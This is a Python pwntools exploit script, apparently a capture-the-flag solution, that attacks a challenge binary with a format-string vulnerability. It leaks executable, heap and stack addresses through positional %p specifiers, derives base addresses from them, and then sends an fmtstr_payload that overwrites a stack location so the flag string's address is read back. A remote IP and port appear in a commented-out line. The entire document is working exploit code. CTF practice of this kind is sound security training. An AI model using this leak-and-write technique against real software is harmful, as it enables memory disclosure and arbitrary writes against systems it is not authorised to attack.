from pwn import *

exe = context.binary = ELF("./chall")
context.log_level = 'debug'
r = process()
# r = remote("194.31.53.241", 13338)
offset = 74
rop = ROP(exe)
def sending_fmtr(payload,offset):
    r.sendline("1")
    r.sendline(payload)
    r.sendline("2")
    leak = r.recv(9999)
    r.sendline("")
    return leak
sending_fmtr("%17$p",17)
leak = sending_fmtr(f"%15$p",15)
leak = sending_fmtr(f"%13$p",13)
# sending_fmtr(fmtstr_payload(77))
print(f"Leaking tewaking: {leak}")
# Decode the leak
decoded = leak.decode()

# Regex to extract 3 addresses
matches = re.findall(r"Posts\s*:\s*1\. (0x[0-9a-fA-F]+)\s*2\. (0x[0-9a-fA-F]+)\s*3\. (0x[0-9a-fA-F]+)", decoded)

if matches:
    exe_leak, heap_leak, stack_leak = matches[0]
    exe_leak = int(exe_leak, 16)
    heap_leak = int(heap_leak, 16)
    stack_leak = int(stack_leak, 16)

    # Page-align exe base (optional: adjust with known offset instead)

    exe_base = exe_leak - 0x133d  # or adjust based on symbol offset
    heap_base = heap_leak - 0x330

    print(f"exe_leak: {hex(exe_leak)}")
    print(f"heap_leak: {hex(heap_leak)}")
    print(f"Fixed exe base: {hex(exe_base)}")
    exe.address = exe_base
    print(f"Fixed heap base: {hex(heap_base)}")
    print(f"stack_leak: {hex(stack_leak)}")
    stack_base = stack_leak - 0x1fd50
    print(f"Fixed stack base: {hex(stack_base)}")
else:
    print("[-] Failed to parse addresses.")
flag = exe.address + 0x2023
heap_overwrite = heap_base + 0x2a0
stack_overwrite = stack_base + 0x1fac0
payload = fmtstr_payload(offset,{stack_overwrite: flag})
# sending_fmtr(payload, offset)
sleep(3)
r.sendline("1")
r.sendline(payload)
r.sendline("1")
# sleep(3)
r.sendline("%6$s")
r.sendline("2")
print(f"Leaking tweaking like insane: {r.recv(9999)}")
r.sendline("")
r.sendline("2")
print(hex(flag))
r.interactive()